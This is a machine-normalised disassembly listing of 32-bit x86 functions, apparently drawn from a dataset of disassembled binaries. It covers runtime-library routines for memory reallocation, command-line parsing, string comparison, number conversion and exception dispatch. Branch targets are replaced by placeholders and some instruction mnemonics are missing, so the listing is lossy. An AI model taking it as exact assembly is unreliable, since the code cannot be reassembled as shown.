sub_40241c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
add esi 0x7
and esi 0xfffffffc
cmp esi 0xc
jge r-xdata
mov ebp eax
sub ebp 0x4
mov edi [ ebp ]
and edi 0x7ffffffc
mov eax ebp
add eax edi
mov ebx eax
cmp edi esi
jne r-xdata
mov esi 0xc
cmp edi esi
jle r-xdata
mov al 0x1
jmp r-xdata
mov eax esi
sub eax edi
mov [ esp + 0x4 ] eax
cmp ebx [ rw-data ]
jne r-xdata
mov edx edi
sub edx esi
mov [ esp ] edx
cmp ebx [ rw-data ]
jne r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp eax [ esp + 0x4 ]
jl r-xdata
mov ebx eax
test [ ebx ] 0x2
jne r-xdata
mov eax [ esp ]
sub [ rw-data ] eax
mov eax [ esp ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
mov eax [ ebx ]
test eax 0x80000000
je r-xdata
mov edx ebx
mov eax edx
mov ecx [ eax + 0x8 ]
mov [ esp ] ecx
mov ecx [ esp ]
cmp ecx [ esp + 0x4 ]
jge r-xdata
call sub_401e90
mov ebx ebp
add ebx edi
mov eax [ esp + 0x4 ]
sub [ rw-data ] eax
mov eax [ esp + 0x4 ]
add [ rw-data ] eax
cmp [ rw-data ] 0xc
jge r-xdata
cmp [ esp ] 0xc
jl r-xdata
mov eax ebx
mov edx [ eax + 0x8 ]
add [ esp ] edx
call sub_401ba0
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
mov eax [ esp ]
add [ rw-data ] eax
mov eax [ esp ]
sub [ rw-data ] eax
mov esi edi
jmp r-xdata
xor eax eax
jmp r-xdata
and eax 0x7ffffffc
add eax ebx
mov ebx eax
mov edx [ esp + 0x4 ]
mov eax ebx
call sub_401f94
test al al
je r-xdata
call sub_401ba0
mov eax [ esp + 0x4 ]
sub [ esp ] eax
cmp [ esp ] 0xc
jl r-xdata
add edx [ esp ]
mov ebx edx
mov eax [ esp ]
sub [ esp + 0x4 ] eax
jmp r-xdata
mov eax esi
sub eax edi
add [ rw-data ] eax
mov eax [ ebp ]
and eax 0x80000003
or esi eax
mov [ ebp ] esi
mov al 0x1
jmp r-xdata
mov eax [ rw-data ]
add [ rw-data ] eax
add esi [ rw-data ]
xor eax eax
mov [ rw-data ] eax
mov esi edi
jmp r-xdata
mov ebx ebp
add ebx esi
mov eax [ esp ]
or eax 0x2
mov [ ebx ] eax
mov eax ebx
add eax 0x4
call sub_401c64
jmp r-xdata
mov ebx ebp
add ebx edi
jmp r-xdata
add esi [ esp ]
mov ebx ebp
add ebx esi
and [ ebx ] 0xfffffffe
jmp r-xdata
mov eax ebp
add eax esi
mov edx [ esp ]
call sub_401e08
jmp r-xdata
sub_4025f8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_4026a9
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_4019fc
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_40241c
test al al
je r-xdata
push rw-data
call sub_401358
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax esi
call sub_4020e8
mov edi eax
mov eax ebx
sub eax 0x4
mov eax [ eax ]
and eax 0x7ffffffc
sub eax 0x4
cmp esi eax
jge r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
test edi edi
je r-xdata
mov eax esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov [ ebp - 0x4 ] edi
mov edx edi
mov ecx ebx
xchg ecx eax
call sub_4028b8
mov eax ebx
call sub_402278
retn
push rw-data
call sub_401360
sub_4026bc
push ebx
test eax eax
jle r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
mov al 0x1
call sub_402818
sub_4026dc
push ebx
test eax eax
je r-xdata
xor ebx ebx
call [ rw-data ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov al 0x2
call sub_402818
sub_4026fc
mov ecx [ eax ]
test ecx ecx
je r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
retn
push eax
mov eax edx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov [ eax ] edx
mov eax ecx
call [ rw-data ]
or eax eax
jne r-xdata
push eax
mov eax ecx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov al 0x1
jmp sub_402818
mov [ ecx ] eax
mov al 0x2
jmp sub_402818
retn
mov [ ecx ] eax
retn
sub_40278c
push ebx
push esi
call sub_405df4
cmp [ eax ] 0x0
je r-xdata
xor ebx ebx
call sub_405df4
mov esi [ eax ]
mov ebx [ esi + 0x8 ]
call sub_405df4
xor eax eax
mov [ esi + 0x8 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_4027cc
push ebx
push esi
mov esi edx
mov ebx eax
and bl 0x7f
cmp [ rw-data ] 0x0
je r-xdata
test bl bl
jne r-xdata
mov edx esi
mov eax ebx
call [ rw-data ]
cmp bl 0x18
ja r-xdata
call sub_405df4
mov ebx [ eax + 0x4 ]
jmp r-xdata
xor eax eax
mov al bl
mov edx esi
call sub_4027c0
xor eax eax
mov al bl
mov bl [ eax + rw-data ]
sub_402854
push esi
push edi
mov esi eax
mov edi [ esp + 0xc ]
xor eax eax
or al [ esi ]
je r-xdata
mov [ edi ] al
test edx edx
jle r-xdata
mov edx 0x1
jmp r-xdata
cmp edx eax
jg r-xdata
sub eax edx
inc eax
test ecx ecx
jl r-xdata
xor ecx ecx
jmp r-xdata
cmp ecx eax
jg r-xdata
add esi edx
mov [ edi ] cl
inc edi
[ edi ] [ esi ]
jmp r-xdata
mov ecx eax
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_4028b8
push esi
push edi
mov esi eax
mov edi edx
mov eax ecx
cmp edi esi
ja r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
sar ecx 0x2
js r-xdata
je r-xdata
pop edi
pop esi
retn
std
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
add esi 0x3
add edi 0x3
[ edi ] [ esi ]
cld
sar ecx 0x2
js r-xdata
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_4028f8
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
jmp r-xdata
mov al [ ebx ]
test al al
je r-xdata
cmp [ ebx ] 0x22
jne r-xdata
cmp al 0x20
jbe r-xdata
xor ebp ebp
mov edi ebx
jmp r-xdata
cmp [ ebx + 0x1 ] 0x22
jne r-xdata
push ebx
call sub_40121c
mov ebx eax
mov al [ ebx ]
cmp al 0x20
ja r-xdata
add ebx 0x2
jmp r-xdata
cmp al 0x22
jne r-xdata
mov eax esi
mov edx ebp
call sub_4045f4
mov ebx edi
mov edi [ esi ]
xor esi esi
jmp r-xdata
push ebx
call sub_40121c
mov edx eax
sub edx ebx
add ebp edx
mov ebx eax
push ebx
call sub_40121c
mov ebx eax
jmp r-xdata
mov al [ ebx ]
cmp al 0x20
ja r-xdata
mov al [ ebx ]
test al al
je r-xdata
cmp al 0x22
jne r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebx ] 0x0
je r-xdata
cmp al 0x22
jne r-xdata
push ebx
call sub_40121c
cmp eax ebx
jbe r-xdata
push ebx
call sub_40121c
mov ebx eax
jmp r-xdata
push ebx
call sub_40121c
mov ebx eax
jmp r-xdata
push ebx
call sub_40121c
mov edx eax
sub edx ebx
add ebp edx
mov ebx eax
mov dl [ ebx ]
mov [ edi + esi ] dl
inc ebx
inc esi
cmp eax ebx
ja r-xdata
mov al [ ebx ]
test al al
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp al 0x22
jne r-xdata
push ebx
call sub_40121c
mov ebx eax
jmp r-xdata
push ebx
call sub_40121c
cmp eax ebx
jbe r-xdata
mov dl [ ebx ]
mov [ edi + esi ] dl
inc ebx
inc esi
cmp eax ebx
ja r-xdata
sub_4029e4
push ebx
push esi
push edi
add esp 0xfffffef8
mov ebx edx
mov esi eax
mov eax ebx
call sub_403fa8
test esi esi
jne r-xdata
call GetCommandLineA
mov edi eax
push 0x105
lea eax [ esp + 0x4 ]
push eax
push 0x0
call sub_40125c
mov ecx eax
mov edx esp
mov eax ebx
call sub_404098
jmp r-xdata
add esp 0x108
pop edi
pop esi
pop ebx
retn
cmp [ ebx ] 0x0
je r-xdata
dec esi
jmp r-xdata
mov edx ebx
mov eax edi
call sub_4028f8
mov edi eax
test esi esi
je r-xdata
sub_402a68
sub esp 0xc
fnstcw [ esp ]
fnstcw [ esp + 0x2 ]
fwait
or [ esp + 0x2 ] 0xf00
fldcw [ esp + 0x2 ]
fistp [ esp + 0x4 ]
fwait
fldcw [ esp ]
pop ecx
pop eax
pop edx
retn
sub_402aa8
push ebx
mov cx [ eax + 0x4 ]
sub cx 0xd7b1
je r-xdata
xor ebx ebx
jmp r-xdata
dec ecx
sub cx 0x2
jae r-xdata
test ebx ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov ebx edx
call ebx
mov ebx eax
jmp r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_402844
xor ebx ebx
jmp r-xdata
cmp eax rw-data
jne r-xdata
mov ebx 0x67
sub_402afc
push ebx
push esi
mov ebx eax
xor esi esi
mov ax [ ebx + 0x4 ]
cmp ax 0xd7b1
jb r-xdata
cmp ebx rw-data
je r-xdata
cmp ax 0xd7b3
ja r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax 0x67
call sub_402844
and ax 0xd7b2
cmp ax 0xd7b2
jne r-xdata
test esi esi
jne r-xdata
mov eax ebx
call [ ebx + 0x1c ]
mov esi eax
test esi esi
je r-xdata
mov eax ebx
call [ ebx + 0x24 ]
mov esi eax
mov eax esi
call sub_402844
jmp r-xdata
sub_402b54
push ebx
mov bl [ edx ]
cmp cl bl
jbe r-xdata
mov [ eax ] cl
inc edx
inc eax
and ecx 0xff
xchg edx eax
call sub_4028b8
pop ebx
retn
mov ecx ebx
sub_402b70
push ebx
push esi
push edi
mov esi eax
mov edi edx
xor eax eax
xor edx edx
mov al [ esi ]
mov dl [ edi ]
inc esi
inc edi
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cl [ esi ]
cmp cl [ edi ]
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
pop edi
pop esi
pop ebx
retn
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
mov cl [ esi + 0x1 ]
cmp cl [ edi + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ esi + 0x2 ]
cmp cl [ edi + 0x2 ]
jne r-xdata
sub_402bf4
push ebx
push esi
push ecx
mov esi ecx
shr esi 0x2
je r-xdata
pop esi
and esi 0x3
je r-xdata
mov ecx [ eax ]
mov ebx [ edx ]
cmp ecx ebx
jne r-xdata
pop esi
pop ebx
retn
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
pop esi
cmp cl bl
jne r-xdata
dec esi
je r-xdata
dec esi
je r-xdata
cmp ch bh
jne r-xdata
add eax 0x4
add edx 0x4
mov ecx [ eax + 0x4 ]
mov ebx [ edx + 0x4 ]
cmp ecx ebx
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov cl [ eax + 0x1 ]
cmp cl [ edx + 0x1 ]
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add eax 0x8
add edx 0x8
dec esi
jne r-xdata
dec esi
je r-xdata
cmp ch bh
jmp r-xdata
mov cl [ eax + 0x2 ]
cmp cl [ edx + 0x2 ]
jne r-xdata
sub_402c64
push edi
mov edi eax
mov ch cl
mov eax ecx
shl eax 0x10
mov ax cx
mov ecx edx
sar ecx 0x2
js r-xdata
pop edi
retn
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
sub_402c84
push ebx
push esi
push edi
mov esi eax
push eax
test eax eax
je r-xdata
inc esi
jmp r-xdata
xor eax eax
xor ebx ebx
mov edi 0xccccccc
pop ebx
sub esi ebx
jmp r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x20
je r-xdata
mov ch 0x0
cmp bl 0x2d
je r-xdata
mov [ edx ] esi
pop edi
pop esi
pop ebx
retn
inc ch
cmp bl 0x2b
je r-xdata
cmp bl 0x24
je r-xdata
mov bl [ esi ]
inc esi
jmp r-xdata
mov edi 0xfffffff
mov bl [ esi ]
inc esi
test bl bl
je r-xdata
cmp bl 0x78
je r-xdata
cmp bl 0x61
jb r-xdata
cmp bl 0x58
je r-xdata
sub bl 0x30
cmp bl 0x9
jbe r-xdata
sub bl 0x20
cmp bl 0x30
jne r-xdata
cmp eax edi
ja r-xdata
sub bl 0x11
cmp bl 0x5
ja r-xdata
test bl bl
je r-xdata
mov bl [ esi ]
inc esi
cmp bl 0x78
je r-xdata
shl eax 0x4
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
add bl 0xa
sub bl 0x30
cmp bl 0x9
ja r-xdata
cmp bl 0x58
je r-xdata
dec ch
jne r-xdata
cmp eax edi
ja r-xdata
test bl bl
je r-xdata
pop ecx
xor esi esi
neg eax
lea eax [ eax + eax * 4 ]
add eax eax
add eax ebx
mov bl [ esi ]
inc esi
test bl bl
jne r-xdata
dec ch
je r-xdata
jmp r-xdata
neg eax
jle r-xdata
test eax eax
jge r-xdata
js r-xdata
jmp r-xdata
sub_402d64
push ebx
push eax
cmp ecx 0xff
jbe r-xdata
mov bl [ edx ]
inc edx
test bl bl
je r-xdata
mov ecx 0xff
pop edx
sub eax edx
mov [ edx ] al
pop ebx
retn
inc eax
mov [ eax ] bl
dec ecx
jne r-xdata
sub_402da4
push ebx
xor ebx ebx
test eax eax
jl r-xdata
neg eax
cmp eax 0x1400
jge r-xdata
je r-xdata
fstp st0
fldz
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402e57 ]
fdivp st1
shr eax 0x5
je r-xdata
pop ebx
retn
cmp eax 0x1400
jge r-xdata
mov edx eax
and edx 0xf
je r-xdata
fstp st0
fld [ ebx + r-xdata ]
jmp r-xdata
mov edx eax
and edx 0x1f
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + sub_402e57 ]
fmulp st1
shr eax 0x5
je r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fdivp st1
mov edx eax
and edx 0xf
je r-xdata
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fdivp st1
jmp r-xdata
shr eax 0x4
je r-xdata
lea edx [ edx + edx * 4 ]
fld [ ebx + edx * 2 + r-xdata ]
fmulp st1
lea eax [ eax + eax * 4 ]
fld [ ebx + eax * 2 + r-xdata ]
fmulp st1
jmp r-xdata
sub_402e57
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3fff ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4002 ] ah
add [ eax ] al
add [ eax ] al
add al cl
add eax 0x40
add [ eax ] al
add [ eax ] al
cli
or [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x64 ] al
or al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
retn
sub_403090
push ebx
xor ebx ebx
push 0x0
call GetKeyboardType
cmp eax 0x7
jne r-xdata
mov eax ebx
pop ebx
retn
push 0x1
call GetKeyboardType
and eax 0xff00
cmp eax 0xd00
je r-xdata
mov bl 0x1
cmp eax 0x400
jne r-xdata
sub_4030c0
push ebp
mov ebp esp
add esp 0xfffffff4
movzx eax [ rw-data ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push 0x0
push r-xdata
push 0x80000002
call sub_4012b4
test eax eax
jne r-xdata
mov ax [ rw-data ]
and ax 0xffc0
mov dx [ ebp - 0x8 ]
and dx 0x3f
or ax dx
mov [ rw-data ] ax
mov esp ebp
pop ebp
retn
xor eax eax
push ebp
push sub_403131
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_4012bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call sub_4012ac
retn
sub_4031bc
push ebx
xor ebx ebx
or edx edx
je r-xdata
mov al bl
pop ebx
retn
mov eax [ eax - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
dec edx
dec ecx
jne r-xdata
mov bh [ ecx + eax ]
xor bh [ ecx + edx ]
and bh 0xdf
jne r-xdata
inc ebx
sub_403264
push ebx
push esi
push edi
mov ebx eax
mov edi edx
stosd [ edi ]
mov ecx [ ebx - 0x28 ]
xor eax eax
push ecx
shr ecx 0x2
dec ecx
[ edi ]
pop ecx
and ecx 0x3
[ edi ]
mov eax edx
mov edx esp
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
push ecx
cmp esp edx
je r-xdata
mov ebx [ ebx ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
pop ebx
mov ecx [ ebx ]
add ebx 0x4
mov ecx [ ebx - 0x48 ]
test ecx ecx
je r-xdata
add ebx 0x1c
dec ecx
jne r-xdata
mov edi [ ebx + 0x14 ]
mov [ edi + eax ] esi
mov esi [ ebx + 0x10 ]
test esi esi
je r-xdata
cmp esp edx
jne r-xdata
sub_4032bc
push ebx
push esi
mov ebx eax
mov esi eax
test esi esi
jne r-xdata
call sub_4049e4
mov eax ebx
mov esi [ esi ]
mov edx [ esi - 0x40 ]
mov esi [ esi - 0x24 ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
sub_4032dc
xchg ecx edx
cmp ecx 0xff000000
jae r-xdata
and ecx 0xffffff
add ecx eax
mov eax edx
mov edx [ ecx ]
jmp sub_4056dc
cmp ecx 0xfe000000
jb r-xdata
jmp ecx
movsx ecx cx
add ecx [ eax ]
jmp [ ecx ]
sub_40330c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_403390
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ esi ] eax
mov edx [ ebp - 0x4 ]
mov eax [ edi ]
call sub_4033a0
mov ebx eax
test ebx ebx
je r-xdata
cmp [ esi ] 0x0
setne bl
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_403397
lea eax [ ebp - 0x8 ]
call sub_4056c4
retn
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebx + 0x18 ]
mov eax edi
call sub_4032dc
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4056dc
add edi eax
mov [ esi ] edi
cmp [ esi ] 0x0
je r-xdata
mov eax [ esi ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
sub_4033a0
push ebx
push esi
mov ebx eax
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
mov ecx [ eax ]
add eax 0x4
xor eax eax
mov ebx [ ebx ]
jmp r-xdata
add eax 0x1c
dec ecx
jne r-xdata
mov esi [ edx + 0x4 ]
cmp esi [ eax + 0x4 ]
jne r-xdata
mov eax [ ebx - 0x48 ]
test eax eax
je r-xdata
mov esi [ edx ]
cmp esi [ eax ]
jne r-xdata
mov esi [ edx + 0x8 ]
cmp esi [ eax + 0x8 ]
jne r-xdata
mov esi [ edx + 0xc ]
cmp esi [ eax + 0xc ]
je r-xdata
pop esi
pop ebx
retn
sub_4033e4
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx ]
call sub_403484
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_403424
push edi
xchg esi eax
jmp r-xdata
mov edi [ esi - 0x30 ]
test edi edi
je r-xdata
mov esi [ esi - 0x24 ]
test esi esi
jne r-xdata
movzx ecx [ edi ]
push ecx
add edi 0x2
[ edi ]
je r-xdata
mov esi [ esi ]
pop edi
retn
pop eax
add eax eax
sub eax ecx
mov esi [ edi + eax * 2 - 0x4 ]
pop edi
retn
pop ecx
sub_403454
push eax
push ecx
mov eax [ eax ]
call sub_403424
pop ecx
pop eax
je r-xdata
pop ecx
jmp r-xdata
jmp esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_403f9c
call [ rw-data ]
sub_40346c
push esi
mov esi edx
mov eax [ eax ]
call sub_403424
mov eax esi
pop esi
jne r-xdata
retn
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0xd2
jmp sub_403f9c
call [ rw-data ]
sub_4034b4
push esi
mov si [ edx ]
or si si
je r-xdata
pop esi
mov ecx [ eax ]
jmp [ ecx - 0x10 ]
cmp si 0xc000
jae r-xdata
push eax
mov eax [ eax ]
call sub_403424
pop eax
je r-xdata
mov ecx esi
pop esi
jmp ecx
sub_4034dc
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
jmp r-xdata
mov esi [ eax - 0x34 ]
test esi esi
je r-xdata
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x2
mov eax [ eax ]
jmp r-xdata
mov ch 0x0
mov cx [ esi ]
add esi ecx
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
mov eax [ esi + 0x2 ]
sub_40352c
push ebx
push esi
push edi
xor ecx ecx
xor edi edi
mov bl [ edx ]
push eax
mov eax [ eax - 0x24 ]
test eax eax
jne r-xdata
mov di [ esi ]
add esi 0x6
mov eax [ eax ]
mov esi [ eax - 0x38 ]
test esi esi
je r-xdata
pop edx
jmp r-xdata
mov bl [ ecx + esi + 0x6 ]
xor bl [ ecx + edx ]
and bl 0xdf
jne r-xdata
lea esi [ ecx + esi + 0x7 ]
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ edx ]
mov cl [ esi + 0x6 ]
jmp r-xdata
dec ecx
jne r-xdata
mov cl [ esi + 0x6 ]
cmp cl bl
je r-xdata
mov eax [ esi ]
pop edx
add eax edx
sub_40357c
push edx
push ecx
push ebx
test dl dl
jl r-xdata
xor edx edx
lea ecx [ esp + 0x10 ]
mov ebx [ fs : edx ]
mov [ ecx ] ebx
mov [ ecx + 0x8 ] ebp
mov [ ecx + 0x4 ] sub_4035a5
mov [ ecx + 0xc ] eax
mov [ fs : edx ] ecx
pop ebx
pop ecx
pop edx
retn
call [ eax - 0xc ]
sub_403610
cmp [ rw-data ] 0x0
je r-xdata
retn
push eax
push eax
push edx
push esp
push 0x2
push 0x0
push 0xeedfae4
call [ rw-data ]
add esp 0x8
pop eax
sub_40364c
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push [ ebx + 0x4 ]
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_403660
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push ebx
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_403674
test ecx ecx
je r-xdata
retn
mov eax [ ecx + 0x1 ]
cmp [ ecx ] 0xe9
je r-xdata
add ecx 0x5
cmp [ ecx ] 0xeb
jne r-xdata
movsx eax al
inc ecx
inc ecx
jmp r-xdata
add ecx eax
sub_403694
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push edx
push ecx
call sub_403674
push ecx
push esp
push 0x1
push 0x0
push 0xeedfae1
call [ rw-data ]
pop ecx
pop ecx
pop edx
pop eax
sub_4036f8
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
cld
call sub_403184
mov edx [ rw-data ]
test edx edx
je r-xdata
or [ eax + 0x4 ] 0x2
push ebx
xor ebx ebx
push esi
push edi
push ebp
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
mov edi [ esp + 0x28 ]
call sub_405df4
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ edi + 0x4 ] r-xdata
add ebx 0x5
call sub_403660
jmp ebx
cmp [ rw-data ] 0x0
ja r-xdata
call edx
test eax eax
je r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
cmp [ ecx ] 0xeefface
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
call sub_403610
cmp [ rw-data ] 0x0
jbe r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
sub_403824
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
je r-xdata
mov eax [ eax + 0x18 ]
mov eax [ eax ]
cld
call sub_403184
mov edx [ rw-data ]
test edx edx
je r-xdata
mov eax [ esp + 0x14 ]
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
mov edi ebp
jmp r-xdata
call edx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
call [ rw-data ]
mov edx [ esp + 0x1c ]
call sub_403610
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax [ eax ]
cmp eax edi
je r-xdata
mov edx [ esp + 0x8 ]
push ebx
push esi
push edi
push ebp
mov ecx [ edx + 0x4 ]
mov ebx [ ecx + 0x5 ]
lea esi [ ecx + 0x9 ]
mov ebp eax
jmp r-xdata
xor ebx ebx
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
or [ eax + 0x4 ] 0x2
push esi
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
pop ebx
mov edi [ esp + 0x28 ]
call sub_405df4
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov [ edi + 0x4 ] r-xdata
mov eax [ esp + 0x8 ]
call sub_40364c
jmp [ ebx + 0x4 ]
cmp [ rw-data ] 0x0
ja r-xdata
mov edx eax
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
mov ecx [ eax - 0x28 ]
cmp ecx [ edi - 0x28 ]
jne r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edi [ edi - 0x24 ]
mov eax [ esi ]
test edi edi
jne r-xdata
mov eax [ eax - 0x2c ]
mov edx [ edi - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
mov edi [ edi ]
add esi 0x8
dec ebx
jne r-xdata
inc eax
inc edx
call sub_402bf4
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
jmp r-xdata
sub_4039ac
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
test [ eax + 0x4 ] 0x6
je r-xdata
mov eax 0x1
retn
mov ecx [ edx + 0x4 ]
mov [ edx + 0x4 ] r-xdata
push ebx
push esi
push edi
push ebp
mov ebp [ edx + 0x8 ]
add ecx 0x5
call sub_403694
call ecx
pop ebp
pop edi
pop esi
